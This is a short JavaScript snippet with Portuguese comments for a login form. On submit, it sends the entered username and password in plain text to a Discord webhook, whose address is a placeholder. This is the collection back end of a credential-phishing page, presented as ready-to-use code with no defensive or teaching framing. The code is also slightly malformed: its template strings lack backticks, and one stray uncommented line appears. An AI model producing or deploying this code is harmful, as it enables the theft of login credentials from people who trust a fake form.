// 1️⃣ Seleciona elementos
const form      = document.getElementById('login-form');
const feedback  = document.getElementById('feedback');

// 2️⃣ URL do seu webhook do Discord
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/SEU_WEBHOOK';

// 3️⃣ Função que envia dados
async function sendToDiscord(username, password){
  const payload = {
    content: 🔐 Novo login\n\nUsuário: ${username}\nSenha: ${password}
  };

  const response = await fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) throw new Error(Discord erro: ${response.status});
  return await response.json();
}

// 4️⃣ Evento submit
form.addEventListener('submit', async e => {
  e.preventDefault();            // evita reload

  Interactive feedback
  feedback.textContent = 'Enviando…';
  feedback.className = 'feedback';

  const username = form.username.value.trim();
  const password = form.password.value.trim();

  try{
    await sendToDiscord(username, password);
    feedback.textContent = '✅ Mensagem enviada!';
    feedback.classList.add('success');
    form.reset();
  }catch(err){
    console.error(err);
    feedback.textContent = '❌ Falha ao enviar.';
    feedback.classList.add('error');
  }
});
